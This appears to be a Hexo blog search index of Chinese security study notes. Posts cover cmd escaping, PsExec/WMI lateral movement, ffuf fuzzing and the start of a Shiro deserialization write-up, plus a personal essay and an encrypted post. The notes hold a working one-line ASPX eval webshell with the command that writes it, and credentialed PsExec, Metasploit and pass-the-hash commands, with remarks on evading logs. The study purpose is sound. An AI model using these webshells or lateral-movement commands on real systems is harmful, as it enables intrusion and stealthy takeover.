<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>dos中的转义字符</title>
    <link href="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/"/>
    <url>/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>经常写shell会有<code>^</code>符号，一开始不太明白这有什么作用，为什么要加<code>^</code>符号，于是便学习一下转义符号的使用。</p><h1 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符^"></a>转义字符^</h1><p><strong>用在特殊符号之前，取消特殊字符的作用。</strong></p><p><strong>一般而言，^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功能，如果需要把它们作为字符输出的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需要对这些特殊字符做转义处理：在每个特殊字符前加上转义字符^，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^^……之类的格式来处理；</strong></p><p><strong>正常webshell：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt;&lt;%eval(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><p>如果使用cmd写入webshell，如果不进行转义的话则是：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">echo</span> <span class="hljs-operator">&lt;%@</span> <span class="hljs-variable">Page</span> <span class="hljs-built_in">Language</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Jscript&quot;</span><span class="hljs-operator">%&gt;&lt;%</span><span class="hljs-variable">eval</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Request</span><span class="hljs-operator">.</span><span class="hljs-built_in">Item</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-operator">,</span><span class="hljs-string">&quot;unsafe&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;%&gt;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">Anonymous</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">aspx</span><br></code></pre></td></tr></table></figure><p>使用上面语句写入shell会报错：</p><p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog\blog\source_posts\dos中的转义字符\image-20220501010819279.png"></p><p>进行转义后则写入成功：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">echo</span> <span class="hljs-operator">^&lt;%@</span> <span class="hljs-variable">Page</span> <span class="hljs-built_in">Language</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Jscript&quot;</span><span class="hljs-operator">%^&gt;^&lt;%</span><span class="hljs-variable">eval</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Request</span><span class="hljs-operator">.</span><span class="hljs-built_in">Item</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-operator">,</span><span class="hljs-string">&quot;unsafe&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;%^&gt;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">Anonymous</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">aspx</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/01/dos%E4%B8%AD%E7%9A%84%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/Blog\blog\source_posts\dos中的转义字符\image-20220501010855969.png"></p><p><strong>&gt; 定向符</strong><br>将输出的内容重定向到指定(文本中)<br>比如<br>echo 123456789 &gt; 1.txt<br>输出字符串到1.txt中</p><p><strong>&gt;&gt; 定向符(追加)</strong><br>将输出内容写入指定(文本中)<br>注意<code>&gt;</code>将覆盖文本中原有内容<code>&gt;&gt;</code> 则是在文本的最后添加内容<code>&gt;&gt;</code>追加内容时，会先换行再追加内容。</p><p>比如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-number">123</span> &gt; <span class="hljs-number">1</span>.txt<br><span class="hljs-attribute">echo</span> <span class="hljs-number">456</span> &gt;&gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>文本中有两行分别是123和456<br>如果<code>echo 456 &gt; 1.txt</code><br>那么原有文本中的所有内容将会被覆盖掉变成456</p>]]></content>
    
    
    <categories>
      
      <category>安全笔记</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网学习笔记-PsExec和WMI使用</title>
    <link href="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h1><p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p><p><strong>建立 ipc$ 连接</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.0.201\ipc$ <span class="hljs-string">&quot;Nan&quot;</span> /user:administrator<br>或者 <br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.0.201 /<span class="hljs-keyword">u</span>:Nan.com\administrator <span class="hljs-string">&quot;Nan&quot;</span><br></code></pre></td></tr></table></figure><p><strong>删除ipc$连接</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">net use * /del /y#断开所有ipc连接<br>net use \\192.168.0.201\ipc$ /del  #断开单个ipc连接<br></code></pre></td></tr></table></figure><p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">PsExec.<span class="hljs-keyword">exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span> -s cmd.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/Blog\blog\source_posts\内网学习笔记-PsExec和WMI使用\image-20220430171219794.png"></p><p><strong>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接。<code>-s</code>使用system权限运行</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PsExec<span class="hljs-selector-class">.exe</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span> -u administrator -<span class="hljs-selector-tag">p</span> Nan -s cmd<span class="hljs-selector-class">.exe</span><br>-u 域\用户名<br>-<span class="hljs-selector-tag">p</span> 密码<br></code></pre></td></tr></table></figure><p><img src="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/Blog\blog\source_posts\内网学习笔记-PsExec和WMI使用\image-20220430171906923.png"></p><p>或者执行以下命令直接回显命令结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">PsExec.exe \\192.168.0.201 -u administrator -p Nan -s cmd.exe /c &quot;ipconfig&quot;<br></code></pre></td></tr></table></figure><p><img src="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/Blog\blog\source_posts\内网学习笔记-PsExec和WMI使用\image-20220430172412515.png"></p><p>在使用 PsExec 时需要注意以下几点：</p><ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li></ul><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">use exploit/windows/smb/psexec<br>set rhost 192.168.0.201<br>set smbuser administrator<br>set smbpass Nan<br>run<br></code></pre></td></tr></table></figure><h1 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h1><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h2 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><strong>wmiexec.py</strong></h2><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p><p><strong>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">python3 wmiexec.py administrator:Nan@192.168.0.201   #如果有机器明文密码可直接通过wmiexec连接<br>python3 wmiexec.py -hashes LMHASH:(NTHASH值) administrator@192.168.0.201#如果没有明文密码可以通过哈希进行传递<br>python3 wmiexec.py -hashes LMHash:NTHash 域名/用户名@目标IP     ##如果没有明文密码可以通过哈希进行传递<br></code></pre></td></tr></table></figure><p><img src="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/Blog\blog\source_posts\内网学习笔记-PsExec和WMI使用\image-20220430174227092.png"></p><h2 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a><strong>wmiexec.vbs</strong></h2><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能。</p><p>wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cscript <span class="hljs-regexp">//</span>nologo wmiexec.vbs /shell <span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span> administrator Nan<br></code></pre></td></tr></table></figure><p><img src="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/Blog\blog\source_posts\内网学习笔记-PsExec和WMI使用\image-20220430175010945.png"></p><p>使用 vmiexec.vbs 执行单条命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cscript</span> wmiexec.vbs /cmd <span class="hljs-number">192.168.0.201</span> administrator Nan <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PsExec%E5%92%8CWMI%E4%BD%BF%E7%94%A8/Blog\blog\source_posts\内网学习笔记-PsExec和WMI使用\image-20220430175257177.png"></p><h1 id="3、PsExec与WMI的区别"><a href="#3、PsExec与WMI的区别" class="headerlink" title="3、PsExec与WMI的区别"></a>3、PsExec与WMI的区别</h1><p>PsExec会产生大量的日志，而 Windows 默认不会将 WMI 的操作记录在日志里。</p>]]></content>
    
    
    <categories>
      
      <category>安全笔记</category>
      
      <category>内网学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ffuf</title>
    <link href="/2022/04/18/ffuf/"/>
    <url>/2022/04/18/ffuf/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>FFUF：一款高效的FUZZ工具。</p><p><strong>特性：</strong></p><p>一个字，快！</p><p>但是速度越快往往也越容易被ban。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>地址：<a href="https://github.com/ffuf/ffuf/releases">https://github.com/ffuf/ffuf/releases</a>  // 可自行下载编译后的 也可以使用源代码进行编译</p><h3 id="基本攻击"><a href="#基本攻击" class="headerlink" title="基本攻击"></a>基本攻击</h3><h4 id="目录扫描："><a href="#目录扫描：" class="headerlink" title="目录扫描："></a>目录扫描：</h4><p><code>-w </code>设置字典 <code>-u</code> 设置目标</p><p>也可以进行子域名枚举，更换字典与FUZZ位置即可，灵活运用。</p><p>这里我以Fuzz目录来做演示：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">ffuf.exe -c -w dict\php.txt -u http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span>/FUZZ<br></code></pre></td></tr></table></figure><p><img src="/2022/04/18/ffuf/image-20220418171554921.png"></p><p>多层目录扫描：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">ffuf.exe -c -w dict\php.txt:FUZZ1 -w dict\dir.txt:FUZZ2 -u http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.201</span>/FUZZ1/FUZZ2<br></code></pre></td></tr></table></figure><p><img src="/2022/04/18/ffuf/image-20220418182952956.png"></p><p>待更新………………</p>]]></content>
    
    
    <categories>
      
      <category>安全笔记</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实习总结-2021-2022</title>
    <link href="/2022/04/15/%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93-2021-2022/"/>
    <url>/2022/04/15/%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93-2021-2022/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d28e89f06cdde444634283c508eaee638ad826eb6a2374bf5187c59d7c32e519">ebe6d89f5c9519161c08ef41abf20baf2150ccb74e271e64ea499db0bb8c2792bef31b107deec3076aaa142d40c59e5829daa0d046117ed097b83c65d7deafb49a09a4b79c4efbee3ad79d7a359f61b8f6cfc821d97985989daf64957452ce9214e1704060a41f00452cadab8e7a42667d8b029c7dc99cf3baf44f66bb7042b1c4a0be0837226c1199bd8ce5a2189fe5ce44c36ece3bab2505cdc228e6a7d249ef6196329ffd9efd05a6b738f11371f86368e2496cd2bfd12bf8677c0a0cd6603166a551ce9d4c8971fd4c4c5af0197004e358b488915a0d5bc41e90a0dd39ec858549d1bbd8600fc795e32fcf105682c8e1d13878bfa0222d7d06b97dc940fb979b7a0338e850128e1937afeba2a6b14282b491d1064aa0cc96e465ea0e662be338a995d6fa4860564f5f33d2e4076941fac5b3b6f3e8860506df20de00143e7c30471d431802bfddb32a8d83b0173320d12b3ac3a35f208ea18b3852ec2cd1f1e0fe3e62035af4fde25a050a28604bc3a8cfeb9f3846d4611458c3a03b1d11949505926cd86771d02e76a6accee7b203c8b73ccf7e6c3e6ff34f2b689b07aeee9f6a5451e7921171170ee7ce635272292de1404c9cc50075ff7de7b597adf95e5052674f78d277687165a57df50caaaddd454f91fdbd22020dcdaae51fa658eb524d07792e272f86294528b798427687def5fcff6aa7d0d30f6a977589fdc16b94b1b00b67c252c8b5be3c52d10f195beabcdecd31bd76206c65c94bfb81679be9cb3af3b533f870f879c1301f20a30a6d39710e0b1db5e0ce9759a4a70ff071b647907909724afe4192f6ae8c3da98f63b3aaf5a39fd73e7de25c220899525dbd306550e8a83156cbce4a4eb5604b3cb9800b29a0a7955eb7504d7658f60643751dbce8d2868ce7615778640f75ecd45e3cab47cf528a92eaa5174841c7ee0d255978212c90cfcb178a26fef5bf1a8551c7d72900ba08c0709bbbcb4162a06b65a3c8bcc971c83b5e0f1c0ae6a529e762dcf15e7eb3b87732c73a07ebd6c50a1cff68eb876b0a6f130b4d5399a97693a75ec6efdaeb3896cceeef30c60de793237382efe7d2a7786b352711363cfdf547f0d2c377599f522d5127a21451099db9a898628b193bcc3c28b064abfc2b22a512d29aa781b29bb3531e2f5a58e595c347774e1c0cad9314431f006eca5b10886108da578dea1eec9bf6788c5fe73098f7f962bb10f15b425e2c0bd0970cf1760a14af847fd47ca5d0f8dae41130c19bd45fb37b9b94f4c945381f190dd6f94ce745508f864a7325188553830715971b50f2256f66cc4ae1080a7bb6e289179332e8e3cd5e9d033f5abf1bd33d20609978148692fb5d1107ddf95ef8d2bd229c04dc423a525fdbf1af01b39a50e2845f06cb20b4aa69b9b0c226642bf9a1c5e5d9b417c213bf22f4058b83376d8368208b10044899b951f9ce6d7d6a0d43ca17af36ed85d3781502bb338de8b91eebf6c430bfe2b0d16a9c34125589697a71ebff95713db8347da4102557681125643a3d587ca891964d5d6c43d3bda119323e69e14f9decfdd8a4797746e209a868016736b3140eeb578fd086514407c1c4a2f7ded84b322d0caa0ce20d6cd9a234dec5272e7b7bd48767d8de4f79860932dc7e1b736edf98699ef0d817588be804aff7237353153714b104aeca5b80f85141588aab2177baade75f2cba18a92a7f3c6bad51dc5193adccc9f980a56558a0f0e6f77d7c5b649feafe7e9297eb040dccfa151de578bc49103cde78879726007fd6d5acdba0c38b77c58519af880749e7f5194e361815825468ee797cdd811c3fb980fa952ddfecf0532c0c8caa5cf5a0642d86e392b1306787b432875bee88baad14656b0923cd11be67ca7e6abea3bc588c7c0cffaf97b365a14cd971fc762f2c03c213f4b56d3c22134bd7f2ae3ca76c601336f724408050477954bc2a9c21f0e8d8e50c3a364ada6b9abe5406cfde26c7f6363952c300e8feb35544d0dee95fb42d1a8ed5e0e19b9542d18ed496ede1cb5bd63379d76efbbaee83935a9a5f34f142ee5416f246dd9759ef28a11461de8e09d05c33a5d7fbdb17375ca1c21a0a724413a8341f6034a0fe3bdba8af76f6add264d000e0fe89252a14dad55b19485a2866680f53779868508dba075ae8bdf96aefc62cbb9c50fa6f6b3bba0ed41094fcb20aee06dd15097030f70ef057edf3ddb85ae21177f7abc88e0b117efb737da8d67dedcaaa0a0065951f62e44a66db609389c9167a47c7c8188a0fd870e9e4ea664f20a47e6bfbb6d407c025645fd100863803d363102c632e9ae8450ccb68432a0b255b11f89b2651b3e9acc4d60d9cef0e7d2aea7e5a641a2fde24bcfb6ccc2b1aa53ac6862dd705407ba5c79657a14022f713ac06a91d6ad023eea745aa16cae4b675ed94ff25e05ea4144639bfbb839e5b94e89fe9dab0d4e9f851fbb59d111cec7c1f4e8d0ea5f1b98f6e16156f53a76af17657107a3eb3e2a02d45f6125ce70aba367fcc0883f8ac4eee650f691d5615c64c7b9ba1525dc9c5dd9757c7acdda0f2fb7ed2a63f6fc5aa3cf39d6c3e9ff82224d7a148e11d3481be061d915ee6917e49632447cb07e3bd842cf81ff819ab8544b36de697b758806bcc346fd8a104f2f78e5a860e462f62d86337cd2becc1c3b5b2506983f9b0bb320c945924796e05d0b0255d194b41043a55147f0f99a19eddadc717909bce4741fc5f79b8686cfc6239c4ddfde39b760ae7e24c2d3fae72d6fd98a75fd932ab80068198bbeb92f50b7217f5c7ef0135849c35c0980380a24935bc5f41fb74a668f4cb044bb2ee4613f087b69b177ed71f882aeccbf4fbb77a711f2dd68816db6079d0337f903bac45dc884a8db23f4b55e40428d0357b5a1d377c07374c739a26d75fa9e11714dfc136fff93b7209c15b940be8de3e8185a105551a75adc1cff2c18e613e0ec6eea148feb2c19cc78f7428426be530be8c5fca31d3261bcb0a86e3de7094e2b988a9812f0084702c7bd9d354d9b8ec4074d0bb465035765396fb5dea73a44fee427d789bc0c41cdb7f72ddc2966112fda4f4f3a8df676385e9a43f11207221da02e2ba4e83bd2b7261045a2f30f98593443a21941b55e6a239d04e83fd1f4f67621dac1ea822953dec6e509e7298d1d98852eff72e3a7da8420610cb4223eb3b8bbcc26be54628669a732967f02550695027e1ebbeb469c2b2781961de87c3c3a8f5777dfdbbba19d47c18a0ae8f155555d768c51732ed7b562deffb8287f17a0388140f970f1076e6f0ac9687ad897ec0349da641275d336b0e072fb9c5b5c5d4afdbe948e84d94d86d0b7c9e6baf6050b72d14d0831d0403b2063fc064464bac44e1dbca02fc0d71c702f9b803819efec9947f968ffb09c7c983d845815a1cf4adfabc64e47c151c6c1e8cdb1a1d678a6c3d809f2c4bfb14cfa1569864c72ce1c20ba8b869c5783e7982ddefc2fae7381fc4e964cdf67b9caa0b6783b48fe60f1f4e8215766a43001a1cbe39fd62cd182b3af0e3960cfd9923b60e9d4a1ecc1945ed1a6457bee0ed9f0f1f280553b007b601e57f36ae531f0eeec5a8a5d8f9f34683e2baaddd3f1c64a599fa0eb81973d609151c45aa5424ee5f54028550d6c8ad3c375900a15148da22436878b7019ebcbfc4c4a19045bb3f7a183f0d0bb7638d137b52c6196f8431edb3d11e1a41a4c277f37ae1b9da19eef915c677c0b43bfb84b39a38646af4d453b7b9d610d4caf80ac318e0b5fa197333d9b83b6c658779a2b1a261b7360c7a4adeeaefcf50ecf4b4aeebee7badd8a741ddc132dc58ead6dd4319e0e0b8bfd910af9e2c7960b6a82a64c72a262b426b0dd09f49376258c641a179380fefc0e275113b18fabc7e30d30e948597b0f532e943cebe2fee708c93ad9f8a7ee4c29a28e3c4b0ae6ba6af4cba70a423fc1a099890d1e8043fc5df43c400236d2a052d6e0b3b18e5847688b95ec4af92190c6c8f69ced39d981f99c9dbb6bbd69b6d65143d1ee3eee929274e6472a45e70be712502158f0fd0c85a33a63f2401ad518fe842cab43fc8f6668f7bc92050869d6fb8e9f22847655d6c2f731984dc36897de27909468b920cb7fb8ac75964f1ba761d602f6a43564af7409a6a82eadcd880469ec8a65c72892c4fac099df66aa195f8921164579421da99e71782a587659623afe0f132a850ebb0c2183a6cb50e00217853cd3e05bdfc5057d4d2a56a9d6c31f8030587673e4bab0939cd499236ded042ba849c10e015097494f89bb9981e2085471c67b6e21f2c1a0a58704c42f43e995f858611ac55651487dbccd6764e846965c75f6350fd4584c089119a4a2dc8ba6059d30c1bb56c9f98229d97ccd329e5f3a35f1c94e0371e954d2980238c3254260e125f2954fbd80347514f576a8cbee65f6d71d62aa9cfddb2a8e350cbc72d4ed604c86f4deadf75a5de87f00d9b9d9f70cb4a59b7f18ad0a340595d46adaf20f64850fb6b312e9cbea553a75fd57e9815f2723f63eff8b3784311db9d6d81a39653edda6be304d1eaecb1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>生活琐事</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>失眠</title>
    <link href="/2022/04/15/%E5%A4%B1%E7%9C%A0/"/>
    <url>/2022/04/15/%E5%A4%B1%E7%9C%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="失眠"><a href="#失眠" class="headerlink" title="失眠"></a>失眠</h3><p>　　一直都很喜欢夜晚的宁静，享受这种宁静的感觉，也常因为焦虑而失眠。凌晨1:30分洗了个澡便在床上躺着，可迟迟也不能入眠，拿起手机看了看已经3:30分，就这样我又失眠了，丝毫没有一点困意，于是我便起床有了这篇文章。</p><p>　　坐在电脑前听着门外的汽车声，不知此刻的脑子在想着什么，不知道要思考什么，更不知道随着年龄的增加自己变得越来越焦虑，生活的焦虑，工作的焦虑。</p><p>　　有时候，焦虑是一种莫名的情绪，它让我对未来充满了恐惧，而有时候焦虑又是一种可怕的力量，它让我们深陷在战战兢兢的黑暗里，迷失在犹犹豫豫的纠结中。可有的时候，焦虑又成为了一种神秘的力量，它会在无形中给予我们压力，逼着我们做好迎接它到来的准备，以至于让我们在困境中爆发潜能，得到我们最初所无法预估的结果。</p><p>　　其实，现在的年轻人几乎每个人都焦虑，焦虑是一种正常的心理状态，无论一个人有多么强悍，多么卓越，在做事的时候，在谋事的时候，他的内心深处总是会有一丝不安的动乱分子在搅动心神。当然，我所说的这种焦虑不仅仅是一种生理上的自然反应，也不是一种身体激素的正常刺激，而是一种来自自我精神上的恐吓。事实上，焦虑与一个人的内心承受能力有关系，也与一个人的精神抗压能力有关系。</p><p>　　事实上，如果一个人足够坚强，足够自信，足够强大，那么他的焦虑情绪就会减少很多，这些焦虑感也不会成为他取得成功的阻碍。相反，如果一个人的能力不出众，精神不剽悍，自信不充足，那么他就会随时随刻充满了恐惧，而且会下意识的把这种焦虑感放到到一百倍，乃至于让自己举步维艰，根本无法触碰到成功的大门。</p><p>　　因此，必须客观的对待焦虑，正确的看待焦虑，只有这样，才不会被焦虑控制，被焦虑摆布。</p>]]></content>
    
    
    <categories>
      
      <category>生活琐事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活琐事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro反序列化漏洞复现</title>
    <link href="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="shiro反序列化漏洞复现"><a href="#shiro反序列化漏洞复现" class="headerlink" title="shiro反序列化漏洞复现"></a>shiro反序列化漏洞复现</h1><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><h2 id="一、shiro550利用条件"><a href="#一、shiro550利用条件" class="headerlink" title="一、shiro550利用条件"></a>一、shiro550利用条件</h2><p>知道aes加密的key且目标服务器含有可利用的攻击链。</p><p><strong>原理：</strong></p><p>　　在Shiro &lt;= 1.2.4中，反序列化过程中所用到的AES加密的key是硬编码在源码中，当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中.<br>　　服务端收到登录请求后，会对cookie的rememberMe字段的值进行base64解码，接着进行AES解密，然后反序列化。由于AES加密是对称式加密(key既能加密数据也能解密数据)，所以当攻击者知道了AES key后，就能够构造恶意的rememberMe cookie值从而触发反序列化漏洞。</p><p><strong>在服务端接收cookie值时，按照如下步骤来解析处理：</strong></p><p>获取RememberMe的值 —&gt; Base64解密 —&gt; ASE解密 –&gt; 反序列化</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>.检索<span class="hljs-comment">RememberMe cookie 